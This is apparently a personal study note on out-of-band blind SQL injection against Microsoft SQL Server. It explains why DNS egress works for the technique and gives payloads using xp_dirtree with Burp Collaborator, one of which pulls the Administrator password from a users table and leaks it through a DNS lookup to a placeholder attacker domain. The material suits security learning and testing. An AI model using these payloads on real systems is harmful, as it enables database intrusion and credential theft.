Some applications process their SQL query asynchronously, which means that the application process the user's request in the original thread, and uses another thread to execute a SQL query. So, using [time-delay SQL injection attack](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FServer-side%20Vulnerabilities%2FSQL%20Injection%2FBlind%20SQL%20Injection%2FBlind%20SQLi%20by%20Triggering%20Time%20Delays) won't work in this scenario.

However, an attacker can still exploit a SQL injection vulnerability by triggering out-of-band network interactions to a system that they control. A variety of network protocols can be used for this attack, but typically the most effective is DNS, as most production networks allow free egress of DNS queries, because they're essential for the normal operation of production systems.

The easiest and most reliable tool for using out-of-band techniques is [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator), which allows you to detect when network interaction occurs. For example, using the following technique on an application running Microsoft SQL server, will cause a DNS query:
```txt
productId='; exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--
```
This will cause the database to perform a DNS lookup on your Burp Collaborator domain.

Additionally, you can use the following payload to use out-of-band channel to exfiltrate data:
```txt
productId=1'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')--
```
This will trigger a DNS lookup with the following results:
```txt
p@$$w0rd.BURP-COLLABORATOR-SUBDOMAIN
```